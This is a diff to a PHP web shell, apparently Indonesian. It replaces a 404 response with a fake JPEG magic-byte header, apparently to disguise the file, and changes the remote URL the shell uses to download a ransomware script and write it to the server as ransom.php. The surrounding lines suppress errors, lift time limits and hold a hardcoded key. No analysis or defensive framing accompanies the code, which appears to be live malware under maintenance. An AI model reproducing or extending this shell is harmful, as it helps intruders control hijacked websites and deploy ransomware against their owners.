@@ -14,7 +14,7 @@ set_time_limit(0);
 @ini_set('display_errors', 0);
 @ini_set('max_execution_time', 0);
 @clearstatcache();
-@http_response_code(404);
+@header("ÿØÿà"); // \xff\xd8\xff\xe0
 $xk = 'f5b165f0a2778d027ecebd64a2439c8d';
 if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
     function kudaxx($value, $preserveKeys = true) {
@@ -4604,11 +4604,11 @@ if (file_exists('ransom.php')) {
     echo "<center><a href='$full/ransom.php' target='_blank'><font color='lime'>> RANSOMWARE <</a></font></center>";
 }
 else {
-    if (explo("https://pst.innomi.net/paste/nvuz5s5hfzjopp3d7nbeesf4/raw", "ransom.php")) {
+    if (explo("https://raw.githubusercontent.com/mrxbarakuda/paste/refs/heads/main/ransom.txt", "ransom.php")) {
         echo "<center><a href='$full/ransom.php' target='_blank'><font color='lime'>> RANSOMWARE <</a></font></center>";
     }
     else {
-        echo "<center><font color='red'>gagal buat file ransomware</font></center>";
+        echo "<center><font color='red'>Gagal buat file ransomware!</font></center>";
     }
 }
 }
